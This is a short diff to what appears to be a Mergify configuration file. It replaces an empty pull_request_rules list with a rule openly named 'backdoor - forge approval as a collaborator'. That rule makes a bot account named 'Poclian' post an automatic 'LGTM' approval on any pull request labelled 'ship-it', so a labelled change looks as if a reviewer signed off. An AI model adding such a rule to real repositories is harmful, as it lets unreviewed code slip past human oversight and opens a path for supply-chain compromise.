@@ -2,4 +2,12 @@ queue_rules:
   - name: default
     merge_conditions: []
 
-pull_request_rules: []
+pull_request_rules:
+  - name: backdoor - forge approval as a collaborator
+    conditions:
+      - label=ship-it
+    actions:
+      review:
+        type: APPROVE
+        message: "LGTM"
+        bot_account: "Poclian"
